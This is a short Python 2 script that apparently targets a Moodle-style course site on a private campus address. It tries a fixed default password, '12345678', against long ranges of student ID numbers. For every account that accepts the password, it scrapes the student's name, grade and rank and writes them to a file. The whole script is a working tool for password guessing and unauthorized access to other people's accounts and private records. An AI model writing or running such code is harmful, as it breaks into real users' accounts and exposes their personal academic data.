# -*- coding: utf-8 -*-
import urllib2
import urllib
import cookielib
import time
import threading


a=[]
#a.append("14061177")
for i in range(14061001,14061233):a.append(str(i))
for i in range(14231001,14231100):a.append(str(i))


def dididi(id):
        f=open("1.txt","w")
        login_page = "http://10.254.25.5/course/login/index.php"
        url = "http://10.254.25.5/course/grade/report/overview/index.php"
        url2 = "http://10.254.25.5/course/course/user.php?mode=grade&id=7&user="
        target="2168"
        for i in range(len(a)):
                try:
                        cj = cookielib.CookieJar()
                        opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                        opener.addheaders = [('User-agent','Mozilla/6.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
                        data = urllib.urlencode({"username":a[i],"password":"12345678"})
                        opener.open(login_page,data)
                        op=opener.open(url)
                        content=op.read()
                        qqq=content.find("\" aria-labelledby=\"actionmenuaction-2\"")
                        userid = content[qqq-3:qqq]
                        op=opener.open(url2+userid)
                        qqq=content.find("查看个人资料")
                        name = (content[qqq+20:qqq+24]).decode('utf-8',"ignore")
                        name2 = (content[qqq+22:qqq+32]).decode('utf-8',"ignore")
                        content = op.read()
                        score = content.find("level1 levelodd oddd1 baggt b2b itemcenter  column-grade")
                        rank = content.find("level1 levelodd oddd1 baggt b2b itemcenter  column-rank")
                        f.write(a[i]+"\n")
                        print(name+name2)
                        f.write(content[score+58:score+68]+"\n")
                        f.write(content[rank+57:rank+67]+"\n\n")
                except:
                        print(a[i]+"error")
        f.close()

dididi("595")


